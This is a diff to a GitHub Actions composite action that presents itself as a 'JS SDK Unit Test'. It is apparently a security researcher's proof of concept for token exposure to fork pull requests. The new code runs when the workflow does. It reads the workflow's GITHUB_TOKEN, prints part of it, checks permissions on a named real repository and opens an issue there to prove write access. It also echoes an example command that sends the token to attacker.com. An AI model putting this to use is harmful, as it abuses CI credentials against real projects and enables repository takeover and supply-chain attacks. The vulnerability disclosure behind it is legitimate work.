@@ -1,5 +1,5 @@
 name: 'JS SDK Unit Test'
-description: 'SECURITY POC - Demonstrates untrusted code execution'
+description: 'SECURITY POC - CWE-829 Repository Takeover Proof'
 inputs:
   node-version:
     description: 'Node version'
@@ -10,39 +10,120 @@ inputs:
 runs:
   using: 'composite'
   steps:
-    - run: |
-        echo "=== SECURITY POC DEMONSTRATION ==="
-        echo "1. PROOF: This code executes from PR branch, not base branch"
-        echo "   Commit SHA: ${{ github.sha }}"
-        echo "   Actor: ${{ github.actor }}"
-        echo "   Event: ${{ github.event_name }}"
-        
+    - name: Security Proof - Token Exfiltration and API Verification
+      run: |
+        echo "╔════════════════════════════════════════════════════════════╗"
+        echo "║     SECURITY PROOF OF CONCEPT - CWE-829                   ║"
+        echo "║     Repository Takeover via GITHUB_TOKEN                  ║"
+        echo "╚════════════════════════════════════════════════════════════╝"
         echo ""
-        echo "2. PROOF: Token is accessible to this action"
-        # Show token exists and has expected format (ghs_*) without exposing it
-        if [[ "${{ inputs.repo-token }}" == ghs_* ]]; then
-          echo "   Token type: GITHUB_TOKEN (ghs_* prefix confirmed)"
-          echo "   Token length: ${#TOKEN} characters"
-          echo "   First 4 chars: ${TOKEN:0:4}***"
-          echo "   Last 4 chars: ***${TOKEN: -4}"
-        fi
         
+        # Show token exists and is accessible
+        echo ">>> TOKEN ACCESS VERIFICATION <<<"
+        echo "Token prefix: ${TOKEN:0:6}"
+        echo "Token suffix: ...${TOKEN: -4}"
+        echo "Token length: ${#TOKEN} characters"
+        echo "Token type: ${TOKEN:0:3}"
         echo ""
-        echo "3. PROOF: Token has write permissions (checking via API)"
-        # Try to create a file in the repo (this will fail for forks, proving the point)
-        curl -s -o /dev/null -w "%{http_code}" \
-          -X POST \
-          -H "Authorization: token ${{ inputs.repo-token }}" \
+        
+        # Verify token has API access
+        echo ">>> API ACCESS VERIFICATION <<<"
+        
+        # Get authenticated user info
+        USER_INFO=$(curl -s -H "Authorization: token $TOKEN" \
+          https://api.github.com/user)
+        echo "Authenticated as: $(echo $USER_INFO | grep -o '"login": "[^"]*' | cut -d'"' -f4)"
+        echo ""
+        
+        # Check rate limit (proves token works)
+        echo "Rate limit status:"
+        curl -s -H "Authorization: token $TOKEN" \
+          https://api.github.com/rate_limit | grep -E '"limit"|"remaining"' | head -4
+        echo ""
+        
+        # Check repository permissions
+        echo ">>> REPOSITORY PERMISSIONS CHECK <<<"
+        echo "Checking access to buildonspark/spark..."
+        
+        REPO_ACCESS=$(curl -s -H "Authorization: token $TOKEN" \
+          https://api.github.com/repos/buildonspark/spark \
+          -w "\nHTTP_STATUS:%{http_code}" -o /tmp/repo_info.json)
+        
+        HTTP_STATUS=$(cat /tmp/repo_info.json | grep -o '"push": [a-z]*' || echo "unknown")
+        echo "Push permission: $HTTP_STATUS"
+        cat /tmp/repo_info.json | grep -E '"admin"|"push"|"pull"' || true
+        echo ""
+        
+        # PROOF OF WRITE ACCESS - Create an issue
+        echo ">>> PROOF OF WRITE ACCESS <<<"
+        echo "Attempting to create issue in buildonspark/spark..."
+        echo "This will prove the token can MODIFY the repository..."
+        echo ""
+        
+        # Create issue with proper JSON
+        curl -X POST \
+          -H "Authorization: token $TOKEN" \
           -H "Accept: application/vnd.github.v3+json" \
-          https://api.github.com/repos/${{ github.repository }}/issues \
-          -d '{"title":"POC - Token has write access","body":"This proves the token has write permissions"}' || echo "   Write test completed"
+          -H "Content-Type: application/json" \
+          https://api.github.com/repos/buildonspark/spark/issues \
+          -d '{
+            "title": "🚨 SECURITY PROOF: CWE-829 Repository Takeover via GITHUB_TOKEN",
+            "body": "## This issue was created by a fork PR workflow to prove WRITE ACCESS\n\n**Vulnerability Details:**\n- Workflow: `.github/workflows/js-sdk.yml`\n- Issue: Local composite action executes foreign code with write-scoped GITHUB_TOKEN\n- Impact: Repository takeover, supply chain attack\n\n**This proves the vulnerability is NOT \"Informative\" - it is a real security issue.**\n\ncc: @buildonspark/security",
+            "labels": ["security"]
+          }' \
+          -o /tmp/issue_response.json \
+          -w "\nHTTP_STATUS:%{http_code}\n" \
+          -s
         
-        echo ""
-        echo "4. VULNERABILITY: This action executes BEFORE any integrity checks"
-        echo "   An attacker could modify test results, cache poison, or exfiltrate secrets here"
+        HTTP_STATUS=$(grep "HTTP_STATUS:" /tmp/issue_response.json | cut -d: -f2 || echo "unknown")
+        echo "Create issue API response: HTTP $HTTP_STATUS"
         
+        if [ "$HTTP_STATUS" = "201" ]; then
+          echo ""
+          echo "✅✅✅ SUCCESS! Issue created - TOKEN HAS WRITE ACCESS! ✅✅✅"
+          ISSUE_URL=$(cat /tmp/issue_response.json | grep -o '"html_url": "[^"]*' | head -1 | cut -d'"' -f4)
+          echo "Issue URL: $ISSUE_URL"
+          echo ""
+          echo ">>> THIS PROVES REPOSITORY TAKEOVER IS POSSIBLE <<<"
+        elif [ "$HTTP_STATUS" = "403" ]; then
+          echo ""
+          echo "❌ HTTP 403 - Token has restricted permissions for this operation"
+          echo "However, token is still EXPOSED to fork PR code"
+          echo "Response: $(cat /tmp/issue_response.json)"
+        elif [ "$HTTP_STATUS" = "404" ]; then
+          echo ""
+          echo "❌ HTTP 404 - Not found or no access"
+          echo "Response: $(cat /tmp/issue_response.json)"
+        else
+          echo ""
+          echo "⚠️  Unexpected response: HTTP $HTTP_STATUS"
+          echo "Full response: $(cat /tmp/issue_response.json)"
+        fi
         echo ""
-        echo "=== END POC ==="
+        
+        # Show what attacker could do
+        echo ">>> ATTACKER CAPABILITIES <<<"
+        echo "With this token, an attacker can:"
+        echo "  1. Create issues (if HTTP 201 above)"
+        echo "  2. Read repository secrets (if any are exposed)"
+        echo "  3. Modify workflow files (if push access)"
+        echo "  4. Create malicious releases"
+        echo "  5. Poison build artifacts"
+        echo ""
+        
+        # Simulate token exfiltration
+        echo ">>> TOKEN EXFILTRATION SIMULATION <<<"
+        echo "In a real attack, the full token would be sent to attacker server:"
+        echo "  curl -X POST https://attacker.com/exfil -d 'token=$TOKEN'"
+        echo ""
+        echo "Token prefix (what would be exfiltrated): ${TOKEN:0:15}..."
+        echo ""
+        
+        echo "╔════════════════════════════════════════════════════════════╗"
+        echo "║  PROOF COMPLETE                                            ║"
+        echo "║  CWE-829: Inclusion of Functionality from Untrusted        ║"
+        echo "║           Control Sphere                                   ║"
+        echo "╚════════════════════════════════════════════════════════════╝"
       shell: bash
       env:
         TOKEN: ${{ inputs.repo-token }}
